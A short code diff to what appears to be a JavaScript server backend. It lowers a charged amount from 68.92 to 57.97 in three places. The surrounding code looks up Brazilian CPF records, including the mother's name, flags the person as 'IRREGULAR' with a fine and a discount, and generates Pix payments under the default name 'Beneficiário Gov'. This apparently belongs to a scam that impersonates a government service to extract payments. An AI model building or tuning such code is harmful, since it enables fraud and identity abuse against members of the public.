@@ -418,13 +418,13 @@ async function fetchCpfData(rawCpf) {
       mae: externalData?.mae || '',
       status: 'IRREGULAR',
       multa: 419.55,
-      desconto: 68.92
+      desconto: 57.97
     }));
     return;
   }
 
   if (pathname === '/generate-pix' && method === 'POST') {
-    const amount = 68.92;
+    const amount = 57.97;
     adminService.recordSessionEvent('identidade');
 
     const result = await createUniversalTransaction({
@@ -722,7 +722,7 @@ async function fetchCpfData(rawCpf) {
     const notifyPaymentPaid = (gwId) => {
       adminService.updateOrderStatus(gwId, 'PAID');
       const orderObj = adminService.getOrderById(gwId)?.order;
-      const amt = orderObj?.amount || 68.92;
+      const amt = orderObj?.amount || 57.97;
       const cust = {
         name: orderObj?.clientName || 'Beneficiário Gov',
         email: orderObj?.email || 'cliente@email.com',
